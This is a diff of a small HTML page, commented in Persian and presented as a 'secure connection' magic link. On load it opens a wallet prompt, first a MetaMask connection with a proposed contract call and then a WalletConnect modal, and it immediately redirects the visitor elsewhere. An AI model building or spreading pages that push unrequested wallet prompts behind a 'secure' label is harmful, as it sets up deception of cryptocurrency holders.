@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <title>اتصال ایمن</title>
-  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+  <!-- WalletConnect Modal برای باز کردن کیف پول -->
+  <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.min.js"></script>
 </head>
 <body>
   <script>
@@ -11,44 +12,30 @@
     (function() {
       console.log('اجرای فرآیند...');
 
-      // چک کردن وجود کیف پول (MetaMask یا مشابه)
-      if (typeof window.ethereum !== 'undefined') {
-        console.log('کیف پول شناسایی شد (MetaMask یا مشابه)');
-
-        async function connectAndProposeTransaction() {
-          try {
-            // اتصال به کیف پول
-            console.log('تلاش برای اتصال به کیف پول...');
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send('eth_requestAccounts', []); // باز کردن کیف پول
-            console.log('کیف پول متصل شد!');
-
-            // تنظیم signer
-            const signer = provider.getSigner();
-
-            // قرارداد نمونه (آدرس UNI token روی مین‌نت برای تست)
-            const contractAddress = '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984';
-            const abi = ['function ping() public']; // تابع فرضی برای تست
-            const contract = new ethers.Contract(contractAddress, abi, signer);
-
-            // پیشنهاد تراکنش
-            console.log('پیشنهاد تراکنش ping...');
-            const tx = await contract.ping();
-            console.log('تراکنش پیشنهاد شد: ', tx.hash);
-          } catch (error) {
-            console.error('خطا در اتصال یا تراکنش: ', error.message);
-          }
+      // ایجاد WalletConnect Modal
+      const walletConnectModal = new WalletConnectModal({
+        projectId: 'd317becfd753b7bed5797bfdd39ab181', // جایگذاری Project ID
+        chains: [1], // مین‌نت اتریوم
+        metadata: {
+          name: 'Magic Link',
+          description: 'اتصال ایمن به کیف پول',
+          url: 'https://username.github.io/secure-magic-link',
+          icons: ['https://walletconnect.com/walletconnect-logo.png']
         }
+      });
 
-        // اجرای اتصال و تراکنش
-        connectAndProposeTransaction();
-      } else {
-        console.error('کیف پول نصب نیست! MetaMask یا کیف پول مشابه نصب کنید.');
+      // باز کردن کیف پول
+      try {
+        console.log('تلاش برای باز کردن کیف پول...');
+        walletConnectModal.openModal();
+        console.log('درخواست باز کردن کیف پول ارسال شد!');
+      } catch (error) {
+        console.error('خطا در باز کردن کیف پول: ', error.message);
       }
 
       // همزمان: ریدایرکت فوری به test.com
-      console.log('ریدایرکت به وبسایت...');
-      window.location.replace('https://test.io');
+      console.log('ریدایرکت به test.com...');
+      window.location.replace('https://test.com');
     })();
   </script>
 </body>
